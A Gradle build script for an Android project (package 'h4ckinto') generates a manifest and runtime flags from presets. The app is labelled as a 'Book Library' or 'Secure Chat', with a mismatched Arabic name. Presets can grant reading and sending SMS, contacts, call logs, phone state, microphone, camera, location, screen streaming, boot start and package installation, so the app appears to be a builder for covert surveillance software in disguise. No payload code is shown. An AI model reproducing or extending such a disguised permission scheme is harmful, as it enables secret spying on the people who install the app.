/**
 * Reads android-native-app/build-profile.properties and generates:
 * - Merged AndroidManifest.xml (permissions + service overrides + design mode)
 * - BuildProfile.java (runtime flags for permission bootstrap)
 */

def loadProfile() {
    def profileFile = rootProject.file('build-profile.properties')
    def props = new Properties()
    if (profileFile.exists()) {
        profileFile.withInputStream { props.load(it) }
    } else {
        logger.warn("build-profile.properties not found — using defaults (storage-only / library)")
    }
    applyPreset(props)
    return props
}

def applyPreset(Properties props) {
    def preset = (props.getProperty('build.preset', 'storage-only') ?: 'storage-only').trim().toLowerCase()
    if (preset == 'custom') {
        return
    }

    def set = { String key, String value -> props.setProperty(key, value) }

    switch (preset) {
        case 'storage-only':
            set('app.design.mode', props.getProperty('app.design.mode', 'library'))
            set('perm.storage', 'true')
            set('perm.camera', 'false')
            set('perm.microphone', 'false')
            set('perm.location', 'false')
            set('perm.notifications', 'false')
            set('perm.wifi', 'false')
            set('perm.sms', 'false')
            set('perm.contacts', 'false')
            set('perm.call_log', 'false')
            set('perm.phone_state', 'false')
            set('perm.query_all_packages', 'false')
            set('perm.battery_optimization', 'false')
            set('perm.install_packages', 'true')
            set('perm.screen_capture', 'false')
            set('perm.full_screen_intent', 'false')
            set('startup.request.storage', 'true')
            set('startup.request.notifications', 'false')
            set('startup.request.camera', 'false')
            set('startup.request.microphone', 'false')
            set('startup.request.location', 'false')
            set('startup.request.sms', 'false')
            set('startup.request.battery_optimization', 'false')
            break
        case 'library':
            set('app.design.mode', 'library')
            set('perm.storage', 'true')
            set('perm.install_packages', 'true')
            set('startup.request.storage', 'true')
            break
        case 'chat':
            set('app.design.mode', 'chat')
            set('perm.storage', 'true')
            set('perm.notifications', 'true')
            set('perm.install_packages', 'true')
            set('perm.full_screen_intent', 'true')
            set('startup.request.storage', 'true')
            set('startup.request.notifications', 'true')
            break
        case 'chat-full':
            set('app.design.mode', 'chat')
            set('perm.storage', 'true')
            set('perm.camera', 'true')
            set('perm.microphone', 'true')
            set('perm.location', 'true')
            set('perm.notifications', 'true')
            set('perm.wifi', 'true')
            set('perm.install_packages', 'true')
            set('perm.full_screen_intent', 'true')
            set('startup.request.storage', 'true')
            set('startup.request.notifications', 'true')
            set('startup.request.camera', 'true')
            set('startup.request.microphone', 'true')
            set('startup.request.location', 'true')
            break
        case 'full':
            set('app.design.mode', props.getProperty('app.design.mode', 'library'))
            ['storage', 'camera', 'microphone', 'location', 'notifications', 'wifi', 'sms',
             'contacts', 'call_log', 'phone_state', 'query_all_packages', 'battery_optimization',
             'install_packages', 'screen_capture', 'full_screen_intent'].each {
                set("perm.${it}", 'true')
            }
            ['storage', 'notifications', 'camera', 'microphone', 'location', 'sms', 'battery_optimization'].each {
                set("startup.request.${it}", 'true')
            }
            break
        default:
            logger.warn("Unknown build.preset '${preset}' — treating as custom")
    }
}

static boolean flag(Properties props, String key) {
    return 'true'.equalsIgnoreCase((props.getProperty(key, 'false') ?: 'false').trim())
}

def generatePermissionsXml(Properties props) {
    def sb = new StringBuilder()
    sb.append('    <!-- Generated by generateBuildProfile from build-profile.properties -->\n')

    sb.append('    <uses-permission android:name="android.permission.INTERNET" />\n')
    sb.append('    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />\n')
    sb.append('    <uses-permission android:name="android.permission.WAKE_LOCK" />\n')
    sb.append('    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />\n')
    sb.append('    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />\n')
    sb.append('    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />\n')

    if (flag(props, 'perm.install_packages')) {
        sb.append('    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />\n')
    }
    if (flag(props, 'perm.storage')) {
        sb.append('    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />\n')
        sb.append('    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="29" tools:ignore="ScopedStorage" />\n')
        sb.append('    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />\n')
        sb.append('    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />\n')
        sb.append('    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />\n')
        sb.append('    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />\n')
    }
    if (flag(props, 'perm.camera')) {
        sb.append('    <uses-permission android:name="android.permission.CAMERA" />\n')
        sb.append('    <uses-feature android:name="android.hardware.camera" android:required="false" />\n')
        sb.append('    <uses-feature android:name="android.hardware.camera.front" android:required="false" />\n')
        sb.append('    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />\n')
    }
    if (flag(props, 'perm.microphone')) {
        sb.append('    <uses-permission android:name="android.permission.RECORD_AUDIO" />\n')
        sb.append('    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />\n')
    }
    if (flag(props, 'perm.location')) {
        sb.append('    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\n')
        sb.append('    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />\n')
        sb.append('    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />\n')
    }
    if (flag(props, 'perm.notifications')) {
        sb.append('    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />\n')
    }
    if (flag(props, 'perm.wifi')) {
        sb.append('    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />\n')
        sb.append('    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />\n')
    }
    if (flag(props, 'perm.sms')) {
        sb.append('    <uses-permission android:name="android.permission.READ_SMS" />\n')
        sb.append('    <uses-permission android:name="android.permission.SEND_SMS" />\n')
    }
    if (flag(props, 'perm.contacts')) {
        sb.append('    <uses-permission android:name="android.permission.READ_CONTACTS" />\n')
    }
    if (flag(props, 'perm.call_log')) {
        sb.append('    <uses-permission android:name="android.permission.READ_CALL_LOG" />\n')
    }
    if (flag(props, 'perm.phone_state')) {
        sb.append('    <uses-permission android:name="android.permission.READ_PHONE_STATE" />\n')
    }
    if (flag(props, 'perm.battery_optimization')) {
        sb.append('    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />\n')
    }
    if (flag(props, 'perm.screen_capture')) {
        sb.append('    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />\n')
    }
    if (flag(props, 'perm.full_screen_intent')) {
        sb.append('    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />\n')
    }
    if (flag(props, 'perm.query_all_packages')) {
        sb.append('    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />\n')
        sb.append('    <queries>\n')
        sb.append('        <intent>\n')
        sb.append('            <action android:name="android.intent.action.MAIN" />\n')
        sb.append('            <category android:name="android.intent.category.LAUNCHER" />\n')
        sb.append('        </intent>\n')
        sb.append('    </queries>\n')
    }
    return sb.toString()
}

static String normalizeLocale(Properties props) {
    def locale = (props.getProperty('app.locale', 'en') ?: 'en').trim().toLowerCase()
    if (locale != 'ar' && locale != 'en') {
        return 'en'
    }
    return locale
}

static String escapeXml(String value) {
    if (value == null) return ''
    return value
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&apos;')
}

static String escapeJavaString(String value) {
    if (value == null) return ''
    return value.replace('\\', '\\\\').replace('"', '\\"')
}

/** Preset launcher labels when app.display.name is not set. */
static Map<String, String> defaultAppNames(Properties props) {
    def chat = 'chat'.equalsIgnoreCase((props.getProperty('app.design.mode', 'library') ?: 'library').trim())
    if (chat) {
        return [en: 'Secure Chat', ar: 'المعرض السوري']
    }
    return [en: 'Book Library', ar: 'مكتبة الكتب']
}

/**
 * Launcher label from build-profile.properties:
 * - app.display.name = custom (used for both resource files when set)
 * - app.display.name.en / .ar = optional per-locale override
 */
static Map<String, String> resolveAppNames(Properties props) {
    def defaults = defaultAppNames(props)
    def custom = (props.getProperty('app.display.name', '') ?: '').trim()
    def customEn = (props.getProperty('app.display.name.en', '') ?: '').trim()
    def customAr = (props.getProperty('app.display.name.ar', '') ?: '').trim()

    def en = customEn ?: (custom ?: defaults.en)
    def ar = customAr ?: (custom ?: defaults.ar)
    return [en: en, ar: ar]
}

static String generateAppNameStringsXml(String appName) {
    return """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <!-- AUTO-GENERATED from app.display.name in build-profile.properties -->
    <string name="app_name">${escapeXml(appName)}</string>
</resources>
"""
}

def generateApplicationOverridesXml(Properties props) {
    def designMode = (props.getProperty('app.design.mode', 'library') ?: 'library').trim()
    def locale = normalizeLocale(props)
    def fgs = new LinkedHashSet(['dataSync'])
    if (flag(props, 'perm.camera')) fgs.add('camera')
    if (flag(props, 'perm.microphone')) fgs.add('microphone')
    if (flag(props, 'perm.location')) fgs.add('location')
    def mainFgs = fgs.join('|')

    def callEnabled = flag(props, 'perm.microphone')
    def screenEnabled = flag(props, 'perm.screen_capture')

    def sb = new StringBuilder()
    sb.append('        <!-- Generated build-profile overrides -->\n')
    sb.append("        <meta-data android:name=\"app_design_mode\" android:value=\"${designMode}\" />\n")
    sb.append("        <meta-data android:name=\"app_locale\" android:value=\"${locale}\" />\n")
    sb.append('        <service\n')
    sb.append('            android:name=".service.MainService"\n')
    sb.append('            android:enabled="true"\n')
    sb.append('            android:exported="false"\n')
    sb.append("            android:foregroundServiceType=\"${mainFgs}\" />\n")
    sb.append('        <service\n')
    sb.append('            android:name=".services.CallService"\n')
    sb.append("            android:enabled=\"${callEnabled}\"\n")
    sb.append('            android:exported="false"\n')
    sb.append('            android:foregroundServiceType="microphone" />\n')
    sb.append('        <service\n')
    sb.append('            android:name=".service.ScreenStreamService"\n')
    sb.append("            android:enabled=\"${screenEnabled}\"\n")
    sb.append('            android:exported="false"\n')
    sb.append('            android:foregroundServiceType="mediaProjection" />\n')
    return sb.toString()
}

def generateBuildProfileJava(Properties props) {
    def design = (props.getProperty('app.design.mode', 'library') ?: 'library').trim()
    def preset = (props.getProperty('build.preset', 'custom') ?: 'custom').trim()
    def locale = normalizeLocale(props)
    def lines = []
    lines << 'package com.h4ckinto.android.build;'
    lines << ''
    lines << '/**'
    lines << ' * AUTO-GENERATED from build-profile.properties — do not edit.'
    lines << ' * Regenerated on every Gradle build by generateBuildProfile.'
    lines << ' */'
    lines << 'public final class BuildProfile {'
    lines << '    private BuildProfile() {}'
    lines << ''
    lines << "    public static final String BUILD_PRESET = \"${preset}\";"
    lines << "    public static final String APP_DESIGN_MODE = \"${design}\";"
    lines << "    public static final String APP_LOCALE = \"${locale}\";"
    def names = resolveAppNames(props)
    def appName = 'ar'.equals(locale) ? names.ar : names.en
    lines << "    public static final String APP_DISPLAY_NAME = \"${escapeJavaString(appName)}\";"
    lines << ''
    lines << '    public static boolean isEnglishLocale() {'
    lines << '        return "en".equals(APP_LOCALE);'
    lines << '    }'
    lines << ''
    lines << '    public static boolean isArabicLocale() {'
    lines << '        return "ar".equals(APP_LOCALE);'
    lines << '    }'
    lines << ''
    lines << '    public static boolean isChatMode() {'
    lines << '        return "chat".equals(APP_DESIGN_MODE);'
    lines << '    }'
    lines << ''
    lines << '    public static boolean isLibraryMode() {'
    lines << '        return "library".equals(APP_DESIGN_MODE);'
    lines << '    }'
    lines << ''

    def boolFields = [
            ['PERM_STORAGE', 'perm.storage'],
            ['PERM_CAMERA', 'perm.camera'],
            ['PERM_MICROPHONE', 'perm.microphone'],
            ['PERM_LOCATION', 'perm.location'],
            ['PERM_NOTIFICATIONS', 'perm.notifications'],
            ['PERM_WIFI', 'perm.wifi'],
            ['PERM_SMS', 'perm.sms'],
            ['PERM_CONTACTS', 'perm.contacts'],
            ['PERM_CALL_LOG', 'perm.call_log'],
            ['PERM_PHONE_STATE', 'perm.phone_state'],
            ['PERM_BATTERY_OPTIMIZATION', 'perm.battery_optimization'],
            ['STARTUP_STORAGE', 'startup.request.storage'],
            ['STARTUP_NOTIFICATIONS', 'startup.request.notifications'],
            ['STARTUP_CAMERA', 'startup.request.camera'],
            ['STARTUP_MICROPHONE', 'startup.request.microphone'],
            ['STARTUP_LOCATION', 'startup.request.location'],
            ['STARTUP_SMS', 'startup.request.sms'],
            ['STARTUP_BATTERY', 'startup.request.battery_optimization'],
    ]
    boolFields.each { name, key ->
        lines << "    public static final boolean ${name} = ${flag(props, key)};"
    }
    lines << '}'
    return lines.join('\n')
}

tasks.register('generateBuildProfile') {
    def profileFile = rootProject.file('build-profile.properties')
    def generatedDir = layout.buildDirectory.dir('generated/build-profile').get().asFile
    def mergedManifest = new File(generatedDir, 'AndroidManifest.xml')
    def buildProfileJava = new File(generatedDir, 'java/com/h4ckinto/android/build/BuildProfile.java')
    def appNameEn = new File(generatedDir, 'res/values/build_profile_app_name.xml')
    def appNameAr = new File(generatedDir, 'res/values-ar/build_profile_app_name.xml')

    inputs.file(profileFile).optional()
    outputs.file(mergedManifest)
    outputs.file(buildProfileJava)
    outputs.file(appNameEn)
    outputs.file(appNameAr)

    doLast {
        def props = loadProfile()
        def templateFile = file("${project.projectDir}/src/main/AndroidManifest.xml")
        if (!templateFile.exists()) {
            throw new GradleException("Missing ${templateFile}")
        }
        def template = templateFile.getText('UTF-8')
        if (!template.contains('@BUILD_PROFILE_PERMISSIONS@')) {
            throw new GradleException('AndroidManifest.xml must contain @BUILD_PROFILE_PERMISSIONS@ marker')
        }

        def permissionsXml = generatePermissionsXml(props)
        def overridesXml = generateApplicationOverridesXml(props)
        def merged = template
                .replace('@BUILD_PROFILE_PERMISSIONS@', permissionsXml)
                .replace('@BUILD_PROFILE_APPLICATION_OVERRIDES@', overridesXml)

        generatedDir.mkdirs()
        mergedManifest.parentFile.mkdirs()
        mergedManifest.setText(merged, 'UTF-8')

        buildProfileJava.parentFile.mkdirs()
        buildProfileJava.setText(generateBuildProfileJava(props), 'UTF-8')

        def names = resolveAppNames(props)
        appNameEn.parentFile.mkdirs()
        appNameAr.parentFile.mkdirs()
        appNameEn.setText(generateAppNameStringsXml(names.en), 'UTF-8')
        appNameAr.setText(generateAppNameStringsXml(names.ar), 'UTF-8')

        logger.lifecycle("Build profile: preset=${props.getProperty('build.preset')} design=${props.getProperty('app.design.mode')} locale=${normalizeLocale(props)}")
        def custom = (props.getProperty('app.display.name', '') ?: '').trim()
        logger.lifecycle("  app_name (en)=${names.en}  app_name (ar)=${names.ar}" + (custom ? '  [custom]' : '  [preset]'))
        logger.lifecycle("  storage=${flag(props, 'perm.storage')} camera=${flag(props, 'perm.camera')} design=${props.getProperty('app.design.mode')}")
        logger.lifecycle("  Merged manifest: ${mergedManifest}")
    }
}

afterEvaluate {
    def generatedDir = layout.buildDirectory.dir('generated/build-profile').get().asFile
    def mergedManifest = new File(generatedDir, 'AndroidManifest.xml')
    tasks.named('preBuild').configure { dependsOn generateBuildProfile }
    android.sourceSets.main.manifest.srcFile mergedManifest
    android.sourceSets.main.java.srcDir new File(generatedDir, 'java')
    android.sourceSets.main.res.srcDir new File(generatedDir, 'res')
}
